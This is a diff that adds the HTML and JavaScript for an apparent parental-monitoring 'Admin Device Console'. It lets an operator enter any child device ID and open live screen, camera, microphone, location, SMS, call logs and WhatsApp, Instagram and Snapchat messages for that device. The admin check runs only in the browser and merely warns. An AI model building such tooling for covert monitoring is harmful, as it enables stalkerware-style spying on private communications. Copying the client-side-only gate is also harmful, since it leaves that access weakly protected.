@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>Admin Device Console — Test any child</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+<script>
+/* Auth fetch: attach JWT + auto-refresh on 401 */
+(function(){
+  try {
+    var F = window.fetch;
+    var refreshing = null;
+    function getAccess(){ try { return localStorage.getItem('access_token')||''; } catch(e){ return ''; } }
+    function getRefresh(){ try { return localStorage.getItem('refresh_token')||''; } catch(e){ return ''; } }
+    function setTokens(a,r){
+      try { if(a) localStorage.setItem('access_token', a); if(r) localStorage.setItem('refresh_token', r); } catch(e){}
+    }
+    function apiBaseFrom(u){
+      try { if(/^https?:\/\//i.test(u)){ var x=new URL(u); return x.origin; } } catch(e){}
+      return (window.API_BASE||window.SERVER_URL||window.BASE_URL||location.origin||'').replace(/\/$/,'');
+    }
+    function doRefresh(base){
+      if(refreshing) return refreshing;
+      var rt = getRefresh();
+      if(!rt) return Promise.reject(new Error('no refresh'));
+      refreshing = F.call(window, (base||location.origin) + '/api/auth/refresh', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ refreshToken: rt })
+      }).then(function(res){ return res.json().then(function(d){ return { ok: res.ok, d: d }; }); })
+      .then(function(x){
+        refreshing = null;
+        if(!x.ok || !(x.d.accessToken||x.d.access_token)) throw new Error('refresh failed');
+        var a = x.d.accessToken || x.d.access_token;
+        var r = x.d.refreshToken || x.d.refresh_token || rt;
+        setTokens(a,r);
+        return a;
+      }).catch(function(e){ refreshing = null; throw e; });
+      return refreshing;
+    }
+    window.fetch = function(input, init){
+      init = init || {};
+      var headers = new Headers(init.headers || {});
+      var url = (typeof input === 'string') ? input : (input && input.url) || '';
+      var token = getAccess();
+      if(token && !headers.has('Authorization')) headers.set('Authorization', 'Bearer ' + token);
+      init.headers = headers;
+      return F.call(window, input, init).then(function(res){
+        if(res.status !== 401) return res;
+        var base = apiBaseFrom(url);
+        return doRefresh(base).then(function(a){
+          var h2 = new Headers(init.headers || {});
+          h2.set('Authorization', 'Bearer ' + a);
+          init.headers = h2;
+          return F.call(window, input, init);
+        }).catch(function(){ return res; });
+      });
+    };
+  } catch(e){}
+})();
+</script>
+<style>
+  :root {
+    --bg: #0b0f19;
+    --card: #141b2d;
+    --border: #243049;
+    --text: #e8eefc;
+    --muted: #8b9bb8;
+    --accent: #5b8cff;
+    --ok: #22c55e;
+    --warn: #f59e0b;
+    --danger: #ef4444;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; font-family: Inter, system-ui, sans-serif;
+    background: radial-gradient(1200px 600px at 10% -10%, #1a2450 0%, var(--bg) 55%);
+    color: var(--text); min-height: 100vh;
+  }
+  .top {
+    display: flex; flex-wrap: wrap; gap: 12px; align-items: center;
+    justify-content: space-between; padding: 16px 20px;
+    border-bottom: 1px solid var(--border); background: rgba(10,14,24,.85);
+    position: sticky; top: 0; z-index: 20; backdrop-filter: blur(10px);
+  }
+  .brand { font-weight: 700; font-size: 1.1rem; display: flex; gap: 10px; align-items: center; }
+  .brand span { color: var(--accent); }
+  .top-actions { display: flex; gap: 8px; flex-wrap: wrap; }
+  .btn {
+    border: 1px solid var(--border); background: var(--card); color: var(--text);
+    padding: 8px 12px; border-radius: 10px; cursor: pointer; text-decoration: none;
+    font-size: .9rem; display: inline-flex; align-items: center; gap: 6px;
+  }
+  .btn:hover { border-color: var(--accent); }
+  .btn-primary { background: var(--accent); border-color: var(--accent); color: #fff; font-weight: 600; }
+  .btn-danger { background: #3b1520; border-color: #7f1d1d; }
+  .wrap { max-width: 1200px; margin: 0 auto; padding: 20px; }
+  .panel {
+    background: var(--card); border: 1px solid var(--border); border-radius: 16px;
+    padding: 18px; margin-bottom: 18px;
+  }
+  .panel h2 { margin: 0 0 8px; font-size: 1.05rem; }
+  .hint { color: var(--muted); font-size: .88rem; margin-bottom: 14px; }
+  .id-row { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
+  .id-row input {
+    flex: 1; min-width: 180px; padding: 12px 14px; border-radius: 12px;
+    border: 1px solid var(--border); background: #0d1322; color: var(--text);
+    font-size: 1.05rem; letter-spacing: .04em; font-weight: 600;
+  }
+  .id-row input:focus { outline: none; border-color: var(--accent); }
+  .status {
+    display: inline-flex; align-items: center; gap: 8px; padding: 6px 10px;
+    border-radius: 999px; font-size: .82rem; background: #0d1322; border: 1px solid var(--border);
+  }
+  .status.ok { border-color: #14532d; color: var(--ok); }
+  .status.warn { border-color: #78350f; color: var(--warn); }
+  .grid {
+    display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+    gap: 12px;
+  }
+  .card {
+    background: #0d1322; border: 1px solid var(--border); border-radius: 14px;
+    padding: 16px 14px; text-decoration: none; color: inherit;
+    transition: .15s ease; min-height: 110px;
+  }
+  .card:hover { border-color: var(--accent); transform: translateY(-2px); }
+  .card i { font-size: 1.35rem; color: var(--accent); margin-bottom: 10px; }
+  .card-title { font-weight: 600; margin-bottom: 4px; }
+  .card-desc { color: var(--muted); font-size: .78rem; line-height: 1.35; }
+  .msg { margin-top: 10px; font-size: .88rem; color: var(--muted); }
+  .msg.err { color: var(--danger); }
+  .msg.ok { color: var(--ok); }
+  .quick { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 12px; }
+</style>
+</head>
+<body>
+  <div class="top">
+    <div class="brand"><i class="fa-solid fa-user-shield"></i> Admin <span>Device Console</span></div>
+    <div class="top-actions">
+      <a class="btn" href="admin-dashboard.html"><i class="fa-solid fa-gauge"></i> Admin Dashboard</a>
+      <a class="btn" href="index.html" id="linkParentIndex"><i class="fa-solid fa-house"></i> Parent Index</a>
+      <button class="btn btn-danger" type="button" onclick="clearDevice()"><i class="fa-solid fa-xmark"></i> Clear ID</button>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <div class="panel">
+      <h2><i class="fa-solid fa-mobile-screen-button"></i> Target Child Device ID</h2>
+      <p class="hint">Yahan koi bhi child device ID daalo. Save ke baad neeche har feature usi ID pe open hogi — screen, camera, gallery, chats, sab. Admin JWT use hoga (token refresh auto).</p>
+      <div class="id-row">
+        <input id="deviceInput" type="text" placeholder="e.g. 411540" autocomplete="off" spellcheck="false"/>
+        <button class="btn btn-primary" type="button" onclick="saveDevice()"><i class="fa-solid fa-floppy-disk"></i> Save &amp; Use</button>
+        <span class="status" id="idStatus"><i class="fa-solid fa-circle-info"></i> No device selected</span>
+      </div>
+      <div class="quick">
+        <button class="btn" type="button" onclick="openFeature('index.html')"><i class="fa-solid fa-house"></i> Open as Parent Index</button>
+        <button class="btn" type="button" onclick="openFeature('view_screen.html')"><i class="fa-solid fa-desktop"></i> Screen</button>
+        <button class="btn" type="button" onclick="openFeature('view_camera.html')"><i class="fa-solid fa-camera"></i> Camera</button>
+        <button class="btn" type="button" onclick="openFeature('view_gallery.html')"><i class="fa-solid fa-images"></i> Gallery</button>
+        <button class="btn" type="button" onclick="openFeature('liveactivity.html')"><i class="fa-solid fa-bolt"></i> Live Activity</button>
+      </div>
+      <div class="msg" id="msg"></div>
+    </div>
+
+    <div class="panel">
+      <h2><i class="fa-solid fa-grid-2"></i> All features (test console)</h2>
+      <p class="hint">Har card nayi tab me open hota hai with <code>?id=DEVICE</code> + localStorage monitoring_id set — token parent pages jaisa attach hota hai.</p>
+      <div class="grid" id="featureGrid">
+        <a class="card" href="#" data-page="index.html" onclick="return openFeature('index.html')">
+          <i class="fa-solid fa-house"></i>
+          <div class="card-title">Dashboard / Index</div>
+          <div class="card-desc">Main parent home</div>
+        </a>
+        <a class="card" href="#" data-page="view_screen.html" onclick="return openFeature('view_screen.html')">
+          <i class="fa-solid fa-desktop"></i>
+          <div class="card-title">Live Screen</div>
+          <div class="card-desc">Live screen share P2P</div>
+        </a>
+        <a class="card" href="#" data-page="view_camera.html" onclick="return openFeature('view_camera.html')">
+          <i class="fa-solid fa-camera"></i>
+          <div class="card-title">Camera</div>
+          <div class="card-desc">Live camera</div>
+        </a>
+        <a class="card" href="#" data-page="view_gallery.html" onclick="return openFeature('view_gallery.html')">
+          <i class="fa-solid fa-images"></i>
+          <div class="card-title">Gallery</div>
+          <div class="card-desc">Photos P2P + cloud</div>
+        </a>
+        <a class="card" href="#" data-page="screenshot.html" onclick="return openFeature('screenshot.html')">
+          <i class="fa-solid fa-camera-retro"></i>
+          <div class="card-title">Screenshot</div>
+          <div class="card-desc">Capture screenshot</div>
+        </a>
+        <a class="card" href="#" data-page="liveactivity.html" onclick="return openFeature('liveactivity.html')">
+          <i class="fa-solid fa-bolt"></i>
+          <div class="card-title">Live Activity</div>
+          <div class="card-desc">Typing / live status</div>
+        </a>
+        <a class="card" href="#" data-page="whatsapp.html" onclick="return openFeature('whatsapp.html')">
+          <i class="fa-brands fa-whatsapp"></i>
+          <div class="card-title">WhatsApp</div>
+          <div class="card-desc">WhatsApp chats</div>
+        </a>
+        <a class="card" href="#" data-page="instagram.html" onclick="return openFeature('instagram.html')">
+          <i class="fa-brands fa-instagram"></i>
+          <div class="card-title">Instagram</div>
+          <div class="card-desc">Instagram DMs</div>
+        </a>
+        <a class="card" href="#" data-page="snap.html" onclick="return openFeature('snap.html')">
+          <i class="fa-solid fa-ghost"></i>
+          <div class="card-title">Snapchat</div>
+          <div class="card-desc">Snapchat chats</div>
+        </a>
+        <a class="card" href="#" data-page="view_sms.html" onclick="return openFeature('view_sms.html')">
+          <i class="fa-solid fa-comment-sms"></i>
+          <div class="card-title">SMS</div>
+          <div class="card-desc">SMS messages</div>
+        </a>
+        <a class="card" href="#" data-page="view_call_logs.html" onclick="return openFeature('view_call_logs.html')">
+          <i class="fa-solid fa-phone"></i>
+          <div class="card-title">Call Logs</div>
+          <div class="card-desc">Call history</div>
+        </a>
+        <a class="card" href="#" data-page="view_contacts.html" onclick="return openFeature('view_contacts.html')">
+          <i class="fa-solid fa-address-book"></i>
+          <div class="card-title">Contacts</div>
+          <div class="card-desc">Phone contacts</div>
+        </a>
+        <a class="card" href="#" data-page="view_apps.html" onclick="return openFeature('view_apps.html')">
+          <i class="fa-solid fa-grip"></i>
+          <div class="card-title">Apps</div>
+          <div class="card-desc">Installed apps</div>
+        </a>
+        <a class="card" href="#" data-page="view_location.html" onclick="return openFeature('view_location.html')">
+          <i class="fa-solid fa-location-dot"></i>
+          <div class="card-title">Location</div>
+          <div class="card-desc">GPS location</div>
+        </a>
+        <a class="card" href="#" data-page="view_notifications.html" onclick="return openFeature('view_notifications.html')">
+          <i class="fa-solid fa-bell"></i>
+          <div class="card-title">Notifications</div>
+          <div class="card-desc">Notification mirror</div>
+        </a>
+        <a class="card" href="#" data-page="view_websites.html" onclick="return openFeature('view_websites.html')">
+          <i class="fa-solid fa-globe"></i>
+          <div class="card-title">Websites</div>
+          <div class="card-desc">Browser history</div>
+        </a>
+        <a class="card" href="#" data-page="view_audio.html" onclick="return openFeature('view_audio.html')">
+          <i class="fa-solid fa-microphone"></i>
+          <div class="card-title">Audio / Mic</div>
+          <div class="card-desc">Live mic</div>
+        </a>
+        <a class="card" href="#" data-page="recording.html" onclick="return openFeature('recording.html')">
+          <i class="fa-solid fa-record-vinyl"></i>
+          <div class="card-title">Recording</div>
+          <div class="card-desc">Screen recording</div>
+        </a>
+        <a class="card" href="#" data-page="camera.html" onclick="return openFeature('camera.html')">
+          <i class="fa-solid fa-video"></i>
+          <div class="card-title">Camera alt</div>
+          <div class="card-desc">Camera page</div>
+        </a>
+        <a class="card" href="#" data-page="network.html" onclick="return openFeature('network.html')">
+          <i class="fa-solid fa-wifi"></i>
+          <div class="card-title">Network</div>
+          <div class="card-desc">Network info</div>
+        </a>
+        <a class="card" href="#" data-page="storage.html" onclick="return openFeature('storage.html')">
+          <i class="fa-solid fa-hard-drive"></i>
+          <div class="card-title">Storage</div>
+          <div class="card-desc">Storage usage</div>
+        </a>
+        <a class="card" href="#" data-page="saved_files.html" onclick="return openFeature('saved_files.html')">
+          <i class="fa-solid fa-folder-open"></i>
+          <div class="card-title">Saved files</div>
+          <div class="card-desc">Saved files</div>
+        </a>
+        <a class="card" href="#" data-page="boot_status.html" onclick="return openFeature('boot_status.html')">
+          <i class="fa-solid fa-power-off"></i>
+          <div class="card-title">Boot status</div>
+          <div class="card-desc">Device boot status</div>
+        </a>
+        <a class="card" href="#" data-page="snapshot_menu.html" onclick="return openFeature('snapshot_menu.html')">
+          <i class="fa-solid fa-clone"></i>
+          <div class="card-title">Snapshot menu</div>
+          <div class="card-desc">Snapshots</div>
+        </a>
+        <a class="card" href="#" data-page="permission.html" onclick="return openFeature('permission.html')">
+          <i class="fa-solid fa-shield"></i>
+          <div class="card-title">Permission</div>
+          <div class="card-desc">Permissions</div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+<script>
+(function(){
+  // Admin gate
+  try {
+    var user = JSON.parse(localStorage.getItem('user') || '{}');
+    var role = (user.role || user.type || '').toString().toLowerCase();
+    var token = localStorage.getItem('access_token') || '';
+    if (!token) {
+      // still allow page but warn
+      document.getElementById('msg').textContent = 'Warning: no access_token — login as admin first (admin-dashboard / login).';
+      document.getElementById('msg').className = 'msg err';
+    } else if (role && role !== 'admin' && role !== 'superadmin' && role !== 'super_admin') {
+      document.getElementById('msg').textContent = 'Logged in as "' + role + '". Admin role recommended for full access.';
+      document.getElementById('msg').className = 'msg warn';
+    }
+  } catch(e){}
+
+  function normId(v){
+    return String(v || '').trim().toUpperCase().replace(/[^A-Z0-9_-]/g,'');
+  }
+
+  function currentId(){
+    return normId(localStorage.getItem('admin_test_device_id') || localStorage.getItem('monitoring_id') || '');
+  }
+
+  function setStatus(id){
+    var el = document.getElementById('idStatus');
+    if (!id) {
+      el.className = 'status warn';
+      el.innerHTML = '<i class="fa-solid fa-circle-info"></i> No device selected';
+      return;
+    }
+    el.className = 'status ok';
+    el.innerHTML = '<i class="fa-solid fa-check"></i> Active: <strong>' + id + '</strong>';
+  }
+
+  window.saveDevice = function(){
+    var id = normId(document.getElementById('deviceInput').value);
+    if (!id) {
+      document.getElementById('msg').textContent = 'Device ID required';
+      document.getElementById('msg').className = 'msg err';
+      return;
+    }
+    try {
+      localStorage.setItem('admin_test_device_id', id);
+      localStorage.setItem('monitoring_id', id); // parent pages read this
+      localStorage.setItem('savedDeviceId', id);
+      localStorage.setItem('admin_test_mode', '1');
+    } catch(e){}
+    document.getElementById('deviceInput').value = id;
+    setStatus(id);
+    document.getElementById('msg').textContent = 'Saved. Ab koi bhi feature open karo — ID ' + id + ' use hogi.';
+    document.getElementById('msg').className = 'msg ok';
+    try {
+      document.getElementById('linkParentIndex').href = 'index.html';
+    } catch(e){}
+  };
+
+  window.clearDevice = function(){
+    try {
+      localStorage.removeItem('admin_test_device_id');
+      localStorage.removeItem('admin_test_mode');
+      // do not wipe monitoring_id if parent was using it elsewhere — only clear admin override note
+    } catch(e){}
+    document.getElementById('deviceInput').value = '';
+    setStatus('');
+    document.getElementById('msg').textContent = 'Cleared admin test device.';
+    document.getElementById('msg').className = 'msg';
+  };
+
+  window.openFeature = function(page){
+    var id = currentId() || normId(document.getElementById('deviceInput').value);
+    if (!id) {
+      document.getElementById('msg').textContent = 'Pehle Device ID save karo';
+      document.getElementById('msg').className = 'msg err';
+      document.getElementById('deviceInput').focus();
+      return false;
+    }
+    // Ensure storage is set so pages without ?id still work
+    try {
+      localStorage.setItem('admin_test_device_id', id);
+      localStorage.setItem('monitoring_id', id);
+      localStorage.setItem('savedDeviceId', id);
+      localStorage.setItem('admin_test_mode', '1');
+    } catch(e){}
+    var url = page + (page.indexOf('?') >= 0 ? '&' : '?') + 'id=' + encodeURIComponent(id);
+    window.open(url, '_blank');
+    return false;
+  };
+
+  // init
+  var existing = currentId();
+  if (existing) {
+    document.getElementById('deviceInput').value = existing;
+    setStatus(existing);
+  }
+  document.getElementById('deviceInput').addEventListener('keydown', function(e){
+    if (e.key === 'Enter') saveDevice();
+  });
+})();
+</script>
+</body>
+</html>
